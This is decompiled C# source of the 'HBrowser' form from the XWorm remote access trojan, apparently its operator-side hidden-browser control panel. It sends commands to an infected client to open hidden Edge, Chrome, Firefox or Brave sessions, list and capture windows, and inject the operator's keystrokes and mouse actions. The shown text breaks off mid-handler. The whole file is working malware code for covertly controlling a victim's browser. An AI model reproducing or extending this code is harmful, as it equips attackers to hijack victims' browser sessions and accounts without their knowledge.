using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000015 RID: 21
	[DesignerGenerated]
	public partial class HBrowser : Form
	{
		// Token: 0x06000257 RID: 599 RVA: 0x0001687C File Offset: 0x00014A7C
		public HBrowser()
		{
			base.Load += this.HBrowser_Load;
			base.FormClosing += this.HBrowser_FormClosing;
			base.ResizeEnd += this.HBrowser_ResizeEnd;
			this.FPS = 0;
			this.sw = Stopwatch.StartNew();
			this.rdSize = default(Size);
			this.InitializeComponent();
		}

		// Token: 0x170000E8 RID: 232
		// (get) Token: 0x0600025A RID: 602 RVA: 0x00017E61 File Offset: 0x00016061
		// (set) Token: 0x0600025B RID: 603 RVA: 0x00017E6B File Offset: 0x0001606B
		internal virtual ToolStripMenuItem BrowserToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000E9 RID: 233
		// (get) Token: 0x0600025C RID: 604 RVA: 0x00017E74 File Offset: 0x00016074
		// (set) Token: 0x0600025D RID: 605 RVA: 0x00017E80 File Offset: 0x00016080
		internal virtual ToolStripMenuItem MicrosoftEdgeToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._MicrosoftEdgeToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MicrosoftEdgeToolStripMenuItem_Click);
				ToolStripMenuItem microsoftEdgeToolStripMenuItem = this._MicrosoftEdgeToolStripMenuItem;
				if (microsoftEdgeToolStripMenuItem != null)
				{
					microsoftEdgeToolStripMenuItem.Click -= value2;
				}
				this._MicrosoftEdgeToolStripMenuItem = value;
				microsoftEdgeToolStripMenuItem = this._MicrosoftEdgeToolStripMenuItem;
				if (microsoftEdgeToolStripMenuItem != null)
				{
					microsoftEdgeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000EA RID: 234
		// (get) Token: 0x0600025E RID: 606 RVA: 0x00017EC3 File Offset: 0x000160C3
		// (set) Token: 0x0600025F RID: 607 RVA: 0x00017ED0 File Offset: 0x000160D0
		internal virtual ToolStripMenuItem ChromeToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ChromeToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ChromeToolStripMenuItem_Click);
				ToolStripMenuItem chromeToolStripMenuItem = this._ChromeToolStripMenuItem;
				if (chromeToolStripMenuItem != null)
				{
					chromeToolStripMenuItem.Click -= value2;
				}
				this._ChromeToolStripMenuItem = value;
				chromeToolStripMenuItem = this._ChromeToolStripMenuItem;
				if (chromeToolStripMenuItem != null)
				{
					chromeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000EB RID: 235
		// (get) Token: 0x06000260 RID: 608 RVA: 0x00017F13 File Offset: 0x00016113
		// (set) Token: 0x06000261 RID: 609 RVA: 0x00017F20 File Offset: 0x00016120
		internal virtual ToolStripMenuItem FireFoxToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._FireFoxToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FireFoxToolStripMenuItem_Click);
				ToolStripMenuItem fireFoxToolStripMenuItem = this._FireFoxToolStripMenuItem;
				if (fireFoxToolStripMenuItem != null)
				{
					fireFoxToolStripMenuItem.Click -= value2;
				}
				this._FireFoxToolStripMenuItem = value;
				fireFoxToolStripMenuItem = this._FireFoxToolStripMenuItem;
				if (fireFoxToolStripMenuItem != null)
				{
					fireFoxToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000EC RID: 236
		// (get) Token: 0x06000262 RID: 610 RVA: 0x00017F63 File Offset: 0x00016163
		// (set) Token: 0x06000263 RID: 611 RVA: 0x00017F70 File Offset: 0x00016170
		internal virtual ToolStripMenuItem BraveToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._BraveToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.BraveToolStripMenuItem_Click);
				ToolStripMenuItem braveToolStripMenuItem = this._BraveToolStripMenuItem;
				if (braveToolStripMenuItem != null)
				{
					braveToolStripMenuItem.Click -= value2;
				}
				this._BraveToolStripMenuItem = value;
				braveToolStripMenuItem = this._BraveToolStripMenuItem;
				if (braveToolStripMenuItem != null)
				{
					braveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000ED RID: 237
		// (get) Token: 0x06000264 RID: 612 RVA: 0x00017FB3 File Offset: 0x000161B3
		// (set) Token: 0x06000265 RID: 613 RVA: 0x00017FBD File Offset: 0x000161BD
		internal virtual ImageList ImageList1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000EE RID: 238
		// (get) Token: 0x06000266 RID: 614 RVA: 0x00017FC6 File Offset: 0x000161C6
		// (set) Token: 0x06000267 RID: 615 RVA: 0x00017FD0 File Offset: 0x000161D0
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000EF RID: 239
		// (get) Token: 0x06000268 RID: 616 RVA: 0x00017FD9 File Offset: 0x000161D9
		// (set) Token: 0x06000269 RID: 617 RVA: 0x00017FE3 File Offset: 0x000161E3
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F0 RID: 240
		// (get) Token: 0x0600026A RID: 618 RVA: 0x00017FEC File Offset: 0x000161EC
		// (set) Token: 0x0600026B RID: 619 RVA: 0x00017FF6 File Offset: 0x000161F6
		internal virtual ToolStripStatusLabel ToolStripStatusLabel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F1 RID: 241
		// (get) Token: 0x0600026C RID: 620 RVA: 0x00017FFF File Offset: 0x000161FF
		// (set) Token: 0x0600026D RID: 621 RVA: 0x0001800C File Offset: 0x0001620C
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170000F2 RID: 242
		// (get) Token: 0x0600026E RID: 622 RVA: 0x0001804F File Offset: 0x0001624F
		// (set) Token: 0x0600026F RID: 623 RVA: 0x0001805C File Offset: 0x0001625C
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				ToolStripMenuItem refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000F3 RID: 243
		// (get) Token: 0x06000270 RID: 624 RVA: 0x0001809F File Offset: 0x0001629F
		// (set) Token: 0x06000271 RID: 625 RVA: 0x000180AC File Offset: 0x000162AC
		internal virtual PictureBox PictureBox1
		{
			[CompilerGenerated]
			get
			{
				return this._PictureBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyPressEventHandler value2 = new KeyPressEventHandler(this.PictureBox1_KeyPress);
				EventHandler value3 = new EventHandler(this.PictureBox1_MouseEnter);
				MouseEventHandler value4 = new MouseEventHandler(this.PictureBox1_MouseDown);
				MouseEventHandler value5 = new MouseEventHandler(this.PictureBox1_MouseMove);
				MouseEventHandler value6 = new MouseEventHandler(this.PictureBox1_MouseUp);
				PictureBox pictureBox = this._PictureBox1;
				if (pictureBox != null)
				{
					pictureBox.KeyPress -= value2;
					pictureBox.MouseEnter -= value3;
					pictureBox.MouseDown -= value4;
					pictureBox.MouseMove -= value5;
					pictureBox.MouseUp -= value6;
				}
				this._PictureBox1 = value;
				pictureBox = this._PictureBox1;
				if (pictureBox != null)
				{
					pictureBox.KeyPress += value2;
					pictureBox.MouseEnter += value3;
					pictureBox.MouseDown += value4;
					pictureBox.MouseMove += value5;
					pictureBox.MouseUp += value6;
				}
			}
		}

		// Token: 0x170000F4 RID: 244
		// (get) Token: 0x06000272 RID: 626 RVA: 0x0001816C File Offset: 0x0001636C
		// (set) Token: 0x06000273 RID: 627 RVA: 0x00018176 File Offset: 0x00016376
		internal virtual Panel Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F5 RID: 245
		// (get) Token: 0x06000274 RID: 628 RVA: 0x0001817F File Offset: 0x0001637F
		// (set) Token: 0x06000275 RID: 629 RVA: 0x0001818C File Offset: 0x0001638C
		internal virtual Guna2GradientButton Guna2GradientButton5
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton5;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton5_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton5;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton5 = value;
				guna2GradientButton = this._Guna2GradientButton5;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170000F6 RID: 246
		// (get) Token: 0x06000276 RID: 630 RVA: 0x000181CF File Offset: 0x000163CF
		// (set) Token: 0x06000277 RID: 631 RVA: 0x000181D9 File Offset: 0x000163D9
		internal virtual Guna2ComboBox Guna2ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F7 RID: 247
		// (get) Token: 0x06000278 RID: 632 RVA: 0x000181E2 File Offset: 0x000163E2
		// (set) Token: 0x06000279 RID: 633 RVA: 0x000181EC File Offset: 0x000163EC
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F8 RID: 248
		// (get) Token: 0x0600027A RID: 634 RVA: 0x000181F5 File Offset: 0x000163F5
		// (set) Token: 0x0600027B RID: 635 RVA: 0x000181FF File Offset: 0x000163FF
		internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000F9 RID: 249
		// (get) Token: 0x0600027C RID: 636 RVA: 0x00018208 File Offset: 0x00016408
		// (set) Token: 0x0600027D RID: 637 RVA: 0x00018212 File Offset: 0x00016412
		internal virtual Label Label15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000FA RID: 250
		// (get) Token: 0x0600027E RID: 638 RVA: 0x0001821B File Offset: 0x0001641B
		// (set) Token: 0x0600027F RID: 639 RVA: 0x00018228 File Offset: 0x00016428
		internal virtual Guna2ToggleSwitch Guna2ToggleSwitch2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2ToggleSwitch2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Guna2ToggleSwitch2_MouseClick);
				Guna2ToggleSwitch guna2ToggleSwitch = this._Guna2ToggleSwitch2;
				if (guna2ToggleSwitch != null)
				{
					guna2ToggleSwitch.MouseClick -= value2;
				}
				this._Guna2ToggleSwitch2 = value;
				guna2ToggleSwitch = this._Guna2ToggleSwitch2;
				if (guna2ToggleSwitch != null)
				{
					guna2ToggleSwitch.MouseClick += value2;
				}
			}
		}

		// Token: 0x170000FB RID: 251
		// (get) Token: 0x06000280 RID: 640 RVA: 0x0001826B File Offset: 0x0001646B
		// (set) Token: 0x06000281 RID: 641 RVA: 0x00018275 File Offset: 0x00016475
		internal virtual Guna2Panel Guna2Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000FC RID: 252
		// (get) Token: 0x06000282 RID: 642 RVA: 0x0001827E File Offset: 0x0001647E
		// (set) Token: 0x06000283 RID: 643 RVA: 0x00018288 File Offset: 0x00016488
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170000FD RID: 253
		// (get) Token: 0x06000284 RID: 644 RVA: 0x000182CB File Offset: 0x000164CB
		// (set) Token: 0x06000285 RID: 645 RVA: 0x000182D5 File Offset: 0x000164D5
		internal virtual Guna2Panel Guna2Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000FE RID: 254
		// (get) Token: 0x06000286 RID: 646 RVA: 0x000182DE File Offset: 0x000164DE
		// (set) Token: 0x06000287 RID: 647 RVA: 0x000182E8 File Offset: 0x000164E8
		internal virtual Guna2Panel Guna2Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000FF RID: 255
		// (get) Token: 0x06000288 RID: 648 RVA: 0x000182F1 File Offset: 0x000164F1
		// (set) Token: 0x06000289 RID: 649 RVA: 0x000182FC File Offset: 0x000164FC
		internal virtual ListView ListView1
		{
			[CompilerGenerated]
			get
			{
				return this._ListView1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.ListView1_KeyDown);
				ListView listView = this._ListView1;
				if (listView != null)
				{
					listView.KeyDown -= value2;
				}
				this._ListView1 = value;
				listView = this._ListView1;
				if (listView != null)
				{
					listView.KeyDown += value2;
				}
			}
		}

		// Token: 0x17000100 RID: 256
		// (get) Token: 0x0600028A RID: 650 RVA: 0x0001833F File Offset: 0x0001653F
		// (set) Token: 0x0600028B RID: 651 RVA: 0x00018349 File Offset: 0x00016549
		internal virtual ColumnHeader ColumnHeader3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000101 RID: 257
		// (get) Token: 0x0600028C RID: 652 RVA: 0x00018352 File Offset: 0x00016552
		// (set) Token: 0x0600028D RID: 653 RVA: 0x0001835C File Offset: 0x0001655C
		internal virtual ColumnHeader ColumnHeader4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000102 RID: 258
		// (get) Token: 0x0600028E RID: 654 RVA: 0x00018365 File Offset: 0x00016565
		// (set) Token: 0x0600028F RID: 655 RVA: 0x0001836F File Offset: 0x0001656F
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000103 RID: 259
		// (get) Token: 0x06000290 RID: 656 RVA: 0x00018378 File Offset: 0x00016578
		// (set) Token: 0x06000291 RID: 657 RVA: 0x00018384 File Offset: 0x00016584
		internal virtual ToolStripMenuItem GetScreenToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._GetScreenToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GetScreenToolStripMenuItem_Click);
				ToolStripMenuItem getScreenToolStripMenuItem = this._GetScreenToolStripMenuItem;
				if (getScreenToolStripMenuItem != null)
				{
					getScreenToolStripMenuItem.Click -= value2;
				}
				this._GetScreenToolStripMenuItem = value;
				getScreenToolStripMenuItem = this._GetScreenToolStripMenuItem;
				if (getScreenToolStripMenuItem != null)
				{
					getScreenToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000104 RID: 260
		// (get) Token: 0x06000292 RID: 658 RVA: 0x000183C7 File Offset: 0x000165C7
		// (set) Token: 0x06000293 RID: 659 RVA: 0x000183D4 File Offset: 0x000165D4
		internal virtual ToolStripMenuItem CloseToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CloseToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CloseToolStripMenuItem_Click);
				ToolStripMenuItem closeToolStripMenuItem = this._CloseToolStripMenuItem;
				if (closeToolStripMenuItem != null)
				{
					closeToolStripMenuItem.Click -= value2;
				}
				this._CloseToolStripMenuItem = value;
				closeToolStripMenuItem = this._CloseToolStripMenuItem;
				if (closeToolStripMenuItem != null)
				{
					closeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000105 RID: 261
		// (get) Token: 0x06000294 RID: 660 RVA: 0x00018417 File Offset: 0x00016617
		// (set) Token: 0x06000295 RID: 661 RVA: 0x00018424 File Offset: 0x00016624
		internal virtual ToolStripMenuItem CustomOpenToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._CustomOpenToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CustomOpenToolStripMenuItem1_Click);
				ToolStripMenuItem customOpenToolStripMenuItem = this._CustomOpenToolStripMenuItem1;
				if (customOpenToolStripMenuItem != null)
				{
					customOpenToolStripMenuItem.Click -= value2;
				}
				this._CustomOpenToolStripMenuItem1 = value;
				customOpenToolStripMenuItem = this._CustomOpenToolStripMenuItem1;
				if (customOpenToolStripMenuItem != null)
				{
					customOpenToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000296 RID: 662 RVA: 0x00018467 File Offset: 0x00016667
		private void HBrowser_Load(object sender, EventArgs e)
		{
			base.MouseWheel += this.MyMouseWheel;
			this.Guna2ComboBox1.SelectedIndex = 3;
			this.Guna2GradientButton1.PerformClick();
		}

		// Token: 0x06000297 RID: 663 RVA: 0x00018498 File Offset: 0x00016698
		private void MyMouseWheel(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				bool flag2 = e.Delta < 0;
				bool flag3 = flag2;
				if (flag3)
				{
					byte[] state = Helper.SB("ScrollDown");
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				else
				{
					byte[] state2 = Helper.SB("ScrollUp");
					Client $VB$NonLocal_3 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_3.BeginSend((byte[])a0);
					}, state2);
				}
			}
		}

		// Token: 0x06000298 RID: 664 RVA: 0x00018544 File Offset: 0x00016744
		private void CustomOpenToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			using (CustomOpen customOpen = new CustomOpen())
			{
				customOpen.Guna2TextBox1.PlaceholderText = "Browser Filename";
				customOpen.Guna2TextBox2.PlaceholderText = "Title";
				customOpen.StartPosition = FormStartPosition.CenterParent;
				bool flag = customOpen.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"OpenBrowser",
						SettingsHelper.SPL,
						"CustomOpen",
						SettingsHelper.SPL,
						customOpen.Guna2TextBox1.Text,
						SettingsHelper.SPL,
						customOpen.Guna2TextBox2.Text,
						SettingsHelper.SPL,
						this.PictureBox1.Width.ToString(),
						SettingsHelper.SPL,
						this.PictureBox1.Height.ToString()
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
		}

		// Token: 0x06000299 RID: 665 RVA: 0x00018670 File Offset: 0x00016870
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600029A RID: 666 RVA: 0x000186C8 File Offset: 0x000168C8
		private void GetScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.ListView1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"GetHWND",
					SettingsHelper.SPL,
					this.ListView1.Items[0].SubItems[0].Text,
					SettingsHelper.SPL,
					this.ListView1.Items[0].ImageKey.ToString(),
					SettingsHelper.SPL,
					this.PictureBox1.Width.ToString(),
					SettingsHelper.SPL,
					this.PictureBox1.Height.ToString()
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x0600029B RID: 667 RVA: 0x000187C0 File Offset: 0x000169C0
		private void CloseToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.ListView1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					foreach (object obj in this.ListView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						byte[] state = Helper.SB(string.Concat(new string[]
						{
							"Close",
							SettingsHelper.SPL,
							listViewItem.SubItems[0].Text,
							SettingsHelper.SPL,
							listViewItem.ImageKey.ToString(),
							SettingsHelper.SPL,
							this.PictureBox1.Width.ToString(),
							SettingsHelper.SPL,
							this.PictureBox1.Height.ToString()
						}));
						HBrowser._Closure$__R133-8 CS$<>8__locals1 = new HBrowser._Closure$__R133-8(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x0600029C RID: 668 RVA: 0x000188F8 File Offset: 0x00016AF8
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("UpdateWindowsActive");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600029D RID: 669 RVA: 0x00018938 File Offset: 0x00016B38
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "OFF", false) == 0;
			if (flag)
			{
				this.Guna2GradientButton1.Text = "Capturing...";
				byte[] state = Helper.SB("HBrowser+" + SettingsHelper.SPL + this.Guna2ComboBox1.Text.Replace("%", "").ToString());
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
			else
			{
				this.Guna2GradientButton1.Text = "OFF";
			}
		}

		// Token: 0x0600029E RID: 670 RVA: 0x000189E4 File Offset: 0x00016BE4
		private void MicrosoftEdgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"OpenBrowser" + SettingsHelper.SPL + "edge" + SettingsHelper.SPL + SettingsHelper.SPL,
				SettingsHelper.SPL,
				this.PictureBox1.Width.ToString(),
				SettingsHelper.SPL,
				this.PictureBox1.Height.ToString()
			}));
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600029F RID: 671 RVA: 0x00018A8C File Offset: 0x00016C8C
		private void ChromeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"OpenBrowser" + SettingsHelper.SPL + "chrome" + SettingsHelper.SPL + SettingsHelper.SPL,
				SettingsHelper.SPL,
				this.PictureBox1.Width.ToString(),
				SettingsHelper.SPL,
				this.PictureBox1.Height.ToString()
			}));
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060002A0 RID: 672 RVA: 0x00018B34 File Offset: 0x00016D34
		private void FireFoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"OpenBrowser" + SettingsHelper.SPL + "firefox" + SettingsHelper.SPL + SettingsHelper.SPL,
				SettingsHelper.SPL,
				this.PictureBox1.Width.ToString(),
				SettingsHelper.SPL,
				this.PictureBox1.Height.ToString()
			}));
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060002A1 RID: 673 RVA: 0x00018BDC File Offset: 0x00016DDC
		private void BraveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"OpenBrowser" + SettingsHelper.SPL + "brave" + SettingsHelper.SPL + SettingsHelper.SPL,
				SettingsHelper.SPL,
				this.PictureBox1.Width.ToString(),
				SettingsHelper.SPL,
				this.PictureBox1.Height.ToString()
			}));
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060002A2 RID: 674 RVA: 0x00018C84 File Offset: 0x00016E84
		private void HBrowser_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB(string.Concat(new string[]
			{
				"CloseHBrowser",
				SettingsHelper.SPL,
				this.PictureBox1.Width.ToString(),
				SettingsHelper.SPL,
				this.PictureBox1.Height.ToString()
			}));
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060002A3 RID: 675 RVA: 0x00018D0C File Offset: 0x00016F0C
		private void HBrowser_ResizeEnd(object sender, EventArgs e)
		{
			bool @checked = this.Guna2ToggleSwitch2.Checked;
			if (@checked)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"Resize",
					SettingsHelper.SPL,
					this.PictureBox1.Width.ToString(),
					SettingsHelper.SPL,
					this.PictureBox1.Height.ToString()
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060002A4 RID: 676 RVA: 0x00018DA8 File Offset: 0x00016FA8
		private void Guna2ToggleSwitch2_MouseClick(object sender, MouseEventArgs e)
		{
			bool @checked = this.Guna2ToggleSwitch2.Checked;
			if (@checked)
			{
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"Resize",
					SettingsHelper.SPL,
					this.PictureBox1.Width.ToString(),
					SettingsHelper.SPL,
					this.PictureBox1.Height.ToString()
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060002A5 RID: 677 RVA: 0x00018E44 File Offset: 0x00017044
		private void PictureBox1_KeyPress(object sender, KeyPressEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				byte[] state = Helper.SB("keyboardClick" + SettingsHelper.SPL + Convert.ToBase64String(Encoding.UTF8.GetBytes(e.KeyChar.ToString())));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060002A6 RID: 678 RVA: 0x00018EC8 File Offset: 0x000170C8
		private void PictureBox1_MouseEnter(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				this.PictureBox1.Focus();
			}
		}

		// Token: 0x060002A7 RID: 679 RVA: 0x00018F04 File Offset: 0x00017104
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0 && this.PictureBox1.Image != null && this.PictureBox1.ContainsFocus;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round((double)(e.X * this.rdSize.Width) / (double)this.PictureBox1.Width), (int)Math.Round((double)(e.Y * this.rdSize.Height) / (double)this.PictureBox1.Height)));
